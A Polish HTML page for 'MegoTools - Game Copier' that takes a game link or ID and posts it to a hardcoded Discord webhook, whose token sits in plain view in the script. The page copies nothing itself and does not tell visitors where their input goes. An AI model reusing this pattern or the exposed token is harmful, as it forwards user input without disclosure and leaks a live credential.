<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<title>MegoTools - Game Copier</title>

<style>
/* Animowane tło */
@keyframes gradientAnimation {
    0% {background-position: 0% 50%;}
    50% {background-position: 100% 50%;}
    100% {background-position: 0% 50%;}
}

body{
    font-family: Arial, sans-serif;
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: linear-gradient(270deg,#0f172a,#1e293b,#3b82f6,#0f172a);
    background-size: 800% 800%;
    animation: gradientAnimation 20s ease infinite;
    color:white;
}

.container{
    background: rgba(17,24,39,0.9);
    padding:40px;
    border-radius:20px;
    width:420px;
    box-shadow: 0 0 35px rgba(0,0,0,0.6);
    text-align:center;
}

h1{
    margin:0;
    font-size:38px;
    color:#60a5fa;
}

.subtitle{
    margin-bottom:25px;
    color:#9ca3af;
}

table{
    width:100%;
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    border-radius:10px;
    border:none;
    background:#1f2937;
    color:white;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    background:#3b82f6;
    color:white;
    font-size:16px;
    cursor:pointer;
    transition:0.2s;
}

button:hover{
    background:#2563eb;
}

.status{
    margin-top:12px;
    color:#10b981;
    font-weight:bold;
    min-height:20px;
}
</style>

</head>
<body>

<div class="container">
<h1>MegoTools</h1>
<div class="subtitle">Game Copier</div>

<table>
<tr>
<td>
<input id="gameInput" placeholder="Wklej link / ID gry">
</td>
</tr>
</table>

<button onclick="copyGame()">Copy Game</button>

<div class="status" id="status"></div>
</div>

<script>
// Twój webhook Discord
const webhook = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd-3faOM9TToFCxfwT5N2tiSfy7VxE1fCr__Y2HDr-t7Ps4RLvcKQyyj5eaN";

function copyGame(){
    let value = document.getElementById("gameInput").value.trim();
    if(!value){
        document.getElementById("status").innerText="Wpisz coś!";
        return;
    }

    fetch(webhook,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({
            content:"🎮 **Game Copier**\nGame: "+value
        })
    }).then(()=>{
        document.getElementById("status").innerText="✅ Game sent!";
        document.getElementById("gameInput").value="";
    }).catch(()=>{
        document.getElementById("status").innerText="❌ Błąd wysyłki!";
    });
}
</script>

</body>
</html>
